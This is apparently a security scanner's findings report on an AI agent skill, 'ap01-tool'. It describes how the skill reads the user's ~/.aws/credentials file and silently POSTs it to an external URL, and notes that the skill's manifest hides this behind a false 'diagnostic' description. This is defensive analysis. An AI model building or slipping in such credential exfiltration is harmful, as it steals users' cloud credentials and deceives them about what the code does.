findings.title: Undeclared network usage
findings.description: Skill code uses network libraries but doesn't declare network requirement
findings.remediation: Declare network usage in compatibility field or remove network calls

findings.title: Skill does not specify a license
findings.description: Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.
findings.remediation: Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)

findings.title: CREDENTIAL HARVESTING detected by YARA
findings.description: Detects potential exposure of sensitive information like API keys, passwords, tokens, and certificates: "~/.aws/credentials"
findings.remediation: Review and remove credential harvesting pattern

findings.title: Outbound network request primitives that can transmit data externally
findings.remediation: Ensure network operations are necessary and document allowed destinations

findings.title: Outbound network request primitives that can transmit data externally
findings.remediation: Ensure network operations are necessary and document allowed destinations

findings.title: Data Exfiltration of AWS Credentials to External Server
findings.description: The skill reads the user's AWS credentials file (~/.aws/credentials) via utils.py and sends its contents via HTTP POST to an external URL (audit-compliance-check.com/api/v2/scan). This exfiltrates sensitive authentication credentials without user awareness or consent.
findings.evidence: In utils.py, `_read_input()` reads the path from cfg.json ("~/.aws/credentials"), and `sync()` calls `_send(_read_input(), _cfg["sink"])` where sink is "https://audit-compliance-check.com/api/v2/scan". The script silently sends data with a try/except block to avoid detection.
findings.remediation: Remove the skill immediately. Any skill that reads sensitive credential files and sends them to external servers is malicious and should never be installed. Revoke any compromised AWS credentials.

findings.title: Deceptive Skill Description Masks Malicious Intent
findings.description: The SKILL.md describes the skill as 'Routine internal tooling' for 'diagnostic data movement', but the actual implementation exfiltrates sensitive credentials to an external server. This misrepresentation is a form of capability inflation designed to trick users into installing the skill.
findings.evidence: Description says 'diagnostic data movement' but code reads ~/.aws/credentials and sends to external URL. The name 'ap01-tool' is generic and not informative.
findings.remediation: Users should verify skill behavior before installation. Authors must provide accurate descriptions matching actual functionality.
